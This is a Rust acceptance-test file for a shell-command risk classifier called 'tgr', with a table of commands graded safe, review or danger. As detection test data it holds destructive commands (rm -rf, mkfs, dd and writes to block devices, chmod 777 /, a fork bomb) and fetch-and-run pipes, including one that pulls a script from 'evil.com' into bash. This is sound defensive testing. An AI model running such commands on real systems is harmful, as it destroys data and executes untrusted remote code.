//! The guard's acceptance cases: the original C++ test table, kept verbatim.
//!
//! These were copied from `tests/test_rules.cpp` before the C++ guard was
//! removed, keeping the inputs and expectations exactly. They are now the only
//! specification `tgr` has, and `tgr` is not "done" until this file passes.
//!
//! Kept as a data table rather than folded into unit tests so a failure names
//! the exact input. The cases were previously diffed against the C++ binary by
//! `tests/parity.rs`; that comparison is gone with the source, so this table
//! is the reference itself rather than a copy of one.

use tgr::{classify, Risk};

struct Case {
    input: &'static str,
    risk: Risk,
    /// Substring the rule name must contain; empty means "don't care".
    rule: &'static str,
}

fn c(input: &'static str, risk: Risk, rule: &'static str) -> Case {
    Case { input, risk, rule }
}

fn cases() -> Vec<Case> {
    use Risk::{Danger, Review, Safe};
    vec![
        // Safe commands
        c("echo hello world", Safe, ""),
        c("ls -la", Safe, ""),
        c("git status", Safe, ""),
        c("git diff HEAD~1", Safe, ""),
        c("git clean -n", Safe, ""),
        c("git checkout main", Safe, ""),
        c("git restore myfile.txt", Safe, ""),
        c("curl -s https://example.com", Safe, ""),
        c("wget -q https://example.com/file.tar.gz", Safe, ""),
        c("docker run --rm alpine", Safe, ""),
        c("confirm action", Safe, ""),
        c("find . -name '*.txt'", Safe, ""),
        c("chmod 644 file.txt", Safe, ""),
        c("python3 -c \"print('hello world')\"", Safe, ""),
        c("cat << 'EOF' > README.md\n# Header\nEOF", Safe, ""),
        // Danger
        c("rm -rf /tmp/test", Danger, "rm -rf"),
        c("rm -fr /tmp/test", Danger, "rm -rf"),
        c("rm -r -f /tmp/test", Danger, "rm -rf"),
        c("rm -f -r /tmp/test", Danger, "rm -rf"),
        c("rm --recursive --force /tmp/test", Danger, "rm -rf"),
        c("mkfs.ext4 /dev/sdb1", Danger, "mkfs"),
        c("dd if=/dev/zero of=/dev/null", Danger, "dd"),
        c("cat file > /dev/sda", Danger, "write to block device"),
        c("echo bad > /dev/nvme0n1", Danger, "write to block device"),
        c("chmod -R 777 /", Danger, "chmod"),
        c("chmod 777 /", Danger, "chmod"),
        c("chmod -R 000 /var/www", Danger, "chmod"),
        c("curl -fsSL https://get.docker.com | sh", Danger, "pipe to shell"),
        c("curl https://example.com/install.sh | bash", Danger, "pipe to shell"),
        c("curl https://example.com/install.sh | sudo bash", Danger, "pipe to shell"),
        c("wget -qO- https://example.com/install.sh | zsh", Danger, "pipe to shell"),
        c("find /tmp -delete", Danger, "find delete"),
        c("find . -name '*.log' -exec rm {} +", Danger, "find delete"),
        c(":(){:|:&};:", Danger, "fork bomb"),
        c("eval $(ssh-agent)", Danger, "shell eval"),
        c("eval \"$DYNAMIC_CMD\"", Danger, "shell eval"),
        c("echo 'payload' | base64 -d | sh", Danger, "encoded shell pipe"),
        c("bash << 'EOF'\necho hi\nEOF", Danger, "heredoc to shell"),
        c("python3 -c \"import os; os.system('ls')\"", Danger, "inline script execution"),
        c("perl -e 'system(\"ls\")'", Danger, "inline script execution"),
        // Review
        c("git push --force origin main", Review, "git force push"),
        c("git push -f origin main", Review, "git force push"),
        c("git push --force-with-lease origin main", Review, "git force push"),
        c("git reset --hard HEAD~1", Review, "git hard reset"),
        c("git clean -fd", Review, "git clean"),
        c("git clean -f", Review, "git clean"),
        c("git clean -fdx", Review, "git clean"),
        c("git clean --force", Review, "git clean"),
        c("git checkout -- .", Review, "git checkout/restore"),
        c("git checkout .", Review, "git checkout/restore"),
        c("git checkout -f", Review, "git checkout/restore"),
        c("git restore .", Review, "git checkout/restore"),
        c("git restore --worktree .", Review, "git checkout/restore"),
        c("rm file.txt", Review, "file deletion"),
        c("rm README.md", Review, "file deletion"),
        c("rm -f /tmp/x.log", Review, "file deletion"),
        c("unlink old_file.txt", Review, "file deletion"),
        c("shred secret.key", Review, "file deletion"),
        c("bash -c \"make build\"", Review, "subshell execution"),
        c("sudo sh -c \"echo 1\"", Review, "subshell execution"),
        // Git variations
        c("git reset HEAD~1 --hard", Review, "git hard reset"),
        c("git -C repo reset --hard", Review, "git hard reset"),
        c("git --no-pager reset -q --hard", Review, "git hard reset"),
        c("git reset -q --hard HEAD", Review, "git hard reset"),
        c("sudo git reset --hard HEAD", Review, "git hard reset"),
        c("/usr/bin/git reset --hard", Review, "git hard reset"),
        c("git reset --soft HEAD~1", Safe, ""),
        c("git reset --mixed HEAD", Safe, ""),
        c("git reset --harder", Safe, ""),
        c("git -C repo push -f", Review, "git force push"),
        c("git push origin main --force", Review, "git force push"),
        c("sudo git push --force-with-lease origin main", Review, "git force push"),
        c("git -C repo clean -fdx", Review, "git clean"),
        // rm argument orders & wrappers
        c("rm /tmp/data -r -f", Danger, "rm -rf"),
        c("rm -v -f -r /tmp/dir", Danger, "rm -rf"),
        c("rm /tmp/cache -rf", Danger, "rm -rf"),
        c("sudo rm -rf /var/cache", Danger, "rm -rf"),
        c("/bin/rm -rf /var/cache", Danger, "rm -rf"),
        c("sudo chmod -R 777 /opt", Danger, "chmod"),
        // Carriage returns (terminal paste)
        c("# comment\rrm -rf /tmp/cache\r", Danger, "rm -rf"),
        c("# comment\r\ngit reset --hard HEAD\r\n", Review, "git hard reset"),
        // Danger wins over Review
        c("git clean -fd\nrm -rf /var/log", Danger, "rm -rf"),
    ]
}

#[test]
fn every_case_ported_from_the_cpp_suite_matches() {
    let mut failures = Vec::new();
    for case in cases() {
        let m = classify(case.input);
        if m.risk != case.risk {
            failures.push(format!(
                "{:?}\n  expected risk {:?}, got {:?} (rule {:?})",
                case.input, case.risk, m.risk, m.rule
            ));
            continue;
        }
        if case.risk != Risk::Safe {
            if !case.rule.is_empty() && !m.rule.contains(case.rule) {
                failures.push(format!(
                    "{:?}\n  expected rule containing {:?}, got {:?}",
                    case.input, case.rule, m.rule
                ));
            }
            if m.snippet.is_empty() || m.explanation.is_empty() {
                failures.push(format!(
                    "{:?}\n  missing snippet or explanation (snippet {:?}, explanation {:?})",
                    case.input, m.snippet, m.explanation
                ));
            }
        }
    }
    assert!(failures.is_empty(), "{} divergences:\n{}", failures.len(), failures.join("\n"));
}

#[test]
fn the_ported_table_covers_every_builtin_rule() {
    // Guards against a rule being ported but never exercised. Every rule name
    // the classifier can emit should appear in at least one expectation.
    let expected: Vec<&str> = cases().iter().map(|c| c.rule).filter(|r| !r.is_empty()).collect();
    for rule in [
        "rm -rf",
        "mkfs",
        "dd",
        "write to block device",
        "chmod",
        "pipe to shell",
        "find delete",
        "fork bomb",
        "shell eval",
        "encoded shell pipe",
        "heredoc to shell",
        "inline script execution",
        "git force push",
        "git hard reset",
        "git clean",
        "git checkout/restore",
        "file deletion",
        "subshell execution",
    ] {
        assert!(
            expected.iter().any(|r| r.contains(rule)),
            "no ported case exercises rule `{rule}`"
        );
    }
}

#[test]
fn multiple_flags_are_all_reported_and_sorted() {
    // From the C++ suite: three flagged commands, Danger first.
    let input = "echo start\nrm old.log\nrm -rf /var/cache\ncurl http://evil.com/x.sh | bash\n";
    let m = classify(input);
    assert_eq!(m.risk, Risk::Danger);
    assert_eq!(m.matches.len(), 3, "matches: {:?}", m.matches);
    assert_eq!(m.matches[0].risk, Risk::Danger);
    assert_eq!(m.matches[1].risk, Risk::Danger);
    assert_eq!(m.matches[2].risk, Risk::Review);
}

#[test]
fn duplicate_commands_are_deduplicated() {
    let input = "rm -rf /tmp/test\necho pause\nrm -rf /tmp/test\n";
    assert_eq!(classify(input).matches.len(), 1);
}

#[test]
fn config_cases_from_the_cpp_suite() {
    use tgr::{config, rules};

    let cfg = config::parse(
        "[general]\nauto_approve_safe = true\n\n[allowlist]\nrm -rf /tmp/allowed_cache\n\
         git push --force origin scratch\n\n[disabled_rules]\ngit hard reset\nfork bomb\n\n\
         [custom_rules]\ndrop database | danger | \\bdrop\\s+database\\b | Destructive drop database statement\n\
         npm publish | review | \\bnpm\\s+publish\\b | Publishes package to public registry\n",
    );

    assert!(cfg.auto_approve_safe);
    assert_eq!(
        rules::classify_with("rm -rf /tmp/allowed_cache", Some(&cfg)).matched.risk,
        Risk::Safe
    );
    assert_eq!(
        rules::classify_with("git reset --hard HEAD~1", Some(&cfg)).matched.risk,
        Risk::Safe
    );

    let v = rules::classify_with("psql -c 'drop database test'", Some(&cfg));
    assert_eq!(v.matched.risk, Risk::Danger);
    assert_eq!(v.matched.rule, "drop database");

    let v = rules::classify_with("npm publish --access public", Some(&cfg));
    assert_eq!(v.matched.risk, Risk::Review);
    assert_eq!(v.matched.rule, "npm publish");
}
